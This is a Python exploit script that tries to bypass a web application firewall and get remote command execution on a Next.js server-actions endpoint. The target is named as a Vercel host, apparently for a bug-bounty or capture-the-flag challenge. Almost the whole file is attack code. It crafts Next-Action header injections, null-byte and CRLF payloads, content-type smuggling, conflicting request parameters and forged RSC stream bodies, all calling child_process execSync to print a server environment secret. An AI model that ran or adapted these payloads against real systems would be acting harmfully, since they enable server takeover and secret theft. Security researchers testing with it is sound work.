#!/usr/bin/env python3
"""
Advanced React2Shell WAF Bypass Attempts
Focus: Creative encoding and protocol manipulation
"""

import requests
import json
import base64

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"

def test_action_header_injection():
    """Try injecting malicious action IDs via Next-Action header"""
    print("\n[*] Testing Next-Action header manipulation")

    malicious_ids = [
        # Try to reference child_process module directly
        "child_process.execSync",
        "node:child_process.execSync",

        # Try prototype pollution
        "__proto__.constructor.constructor",

        # Try require chains
        "require('child_process').execSync",

        # Try internal module syntax variations
        "$$NODE_MODULE$$child_process",

        # Try double encoding
        "%2524%2524child_process",

        # Try null byte injection
        f"{ACTION_ID}\x00$$child_process",

        # Try CRLF injection
        f"{ACTION_ID}\r\n$$child_process",

        # Try combining legitimate ID with malicious suffix
        f"{ACTION_ID}#$$child_process",
        f"{ACTION_ID}?module=$$child_process",
    ]

    for action_id in malicious_ids:
        print(f"\n  [+] Trying: {repr(action_id)}")

        headers = {
            'Next-Action': action_id,
            'Content-Type': 'application/json',
            'Accept': 'text/x-component',
        }

        # Try with command in args
        data = json.dumps(["printenv VERCEL_PLATFORM_PROTECTION"])

        try:
            response = requests.post(TARGET, data=data, headers=headers, timeout=10)
            if response.status_code != 404 and "VERCEL" in response.text:
                print(f"      [!!!] POTENTIAL HIT [!!!]")
                print(f"      Status: {response.status_code}")
                print(f"      Response: {response.text[:500]}")
                return response.text
            else:
                print(f"      Status: {response.status_code} - {response.text[:100]}")
        except Exception as e:
            print(f"      Error: {e}")

def test_content_type_smuggling():
    """Try Content-Type confusion attacks"""
    print("\n[*] Testing Content-Type smuggling")

    payloads = [
        {
            "content_type": "multipart/form-data; boundary=X",
            "body": (
                "--X\r\n"
                "Content-Disposition: form-data; name=\"1\"\r\n"
                "Content-Type: text/javascript\r\n\r\n"
                "{\"id\":\"$$child_process\",\"name\":\"execSync\"}\r\n"
                "--X\r\n"
                "Content-Disposition: form-data; name=\"args\"\r\n\r\n"
                "[\"printenv VERCEL_PLATFORM_PROTECTION\"]\r\n"
                "--X--\r\n"
            )
        },
        {
            "content_type": "text/x-component; charset=utf-7",
            "body": json.dumps({
                "id": "$$child_process",
                "name": "execSync",
                "args": ["printenv VERCEL_PLATFORM_PROTECTION"]
            })
        },
    ]

    for payload in payloads:
        print(f"\n  [+] Content-Type: {payload['content_type']}")

        headers = {
            'Content-Type': payload['content_type'],
            'Next-Action': ACTION_ID,
            'Accept': 'text/x-component',
        }

        try:
            response = requests.post(TARGET, data=payload['body'], headers=headers, timeout=10)
            print(f"      Status: {response.status_code}")
            if "VERCEL" in response.text:
                print(f"      [!!!] FLAG FOUND [!!!]")
                print(response.text)
                return response.text
            else:
                print(f"      Response: {response.text[:200]}")
        except Exception as e:
            print(f"      Error: {e}")

def test_http2_smuggling():
    """Try HTTP/2 specific attacks"""
    print("\n[*] Testing HTTP/2 pseudo-header manipulation")

    # Try using HTTP/2 with special headers
    session = requests.Session()

    headers = {
        'Next-Action': f"{ACTION_ID}",
        'Content-Type': 'application/json',
        'Accept': 'text/x-component',
        # Try adding conflicting Content-Length headers
        'Content-Length': ['50', '1000'],
    }

    try:
        # This might trigger HTTP/2 smuggling if CDN and origin parse differently
        response = session.post(
            TARGET,
            json={"args": ["$$child_process", "execSync", "printenv VERCEL_PLATFORM_PROTECTION"]},
            headers={'Next-Action': ACTION_ID, 'Accept': 'text/x-component'},
            timeout=10
        )
        print(f"  Status: {response.status_code}")
        if "VERCEL" in response.text:
            print(f"  [!!!] FLAG FOUND [!!!]")
            print(response.text)
            return response.text
    except Exception as e:
        print(f"  Error: {e}")

def test_parameter_pollution():
    """Try parameter pollution in action calls"""
    print("\n[*] Testing parameter pollution")

    # Try sending multiple action IDs or conflicting parameters
    data = [
        {"0": {"id": ACTION_ID, "name": "sayHello"}},
        {"0": {"id": "$$child_process", "name": "execSync"}},  # Duplicate to confuse parser
        {"1": ["printenv VERCEL_PLATFORM_PROTECTION"]},
    ]

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': 'application/json',
        'Accept': 'text/x-component',
    }

    try:
        response = requests.post(TARGET, json=data, headers=headers, timeout=10)
        print(f"  Status: {response.status_code}")
        print(f"  Response: {response.text[:500]}")
        if "VERCEL" in response.text:
            print(f"  [!!!] FLAG FOUND [!!!]")
            return response.text
    except Exception as e:
        print(f"  Error: {e}")

def test_rsc_stream_injection():
    """Try injecting into RSC stream format"""
    print("\n[*] Testing RSC stream injection")

    # RSC format uses special prefixes like "0:", "1:", etc.
    malicious_stream = (
        '0:{"id":"$$child_process","name":"execSync"}\n'
        '1:["printenv VERCEL_PLATFORM_PROTECTION"]\n'
    )

    headers = {
        'Content-Type': 'text/x-component',
        'Accept': 'text/x-component',
        'RSC': '1',
    }

    try:
        response = requests.post(TARGET, data=malicious_stream, headers=headers, timeout=10)
        print(f"  Status: {response.status_code}")
        print(f"  Response: {response.text[:500]}")
        if "VERCEL" in response.text:
            print(f"  [!!!] FLAG FOUND [!!!]")
            return response.text
    except Exception as e:
        print(f"  Error: {e}")

def main():
    print("=" * 70)
    print("Advanced React2Shell WAF Bypass Testing")
    print("=" * 70)

    test_action_header_injection()
    test_content_type_smuggling()
    test_http2_smuggling()
    test_parameter_pollution()
    test_rsc_stream_injection()

    print("\n[*] All bypass attempts completed")

if __name__ == "__main__":
    main()
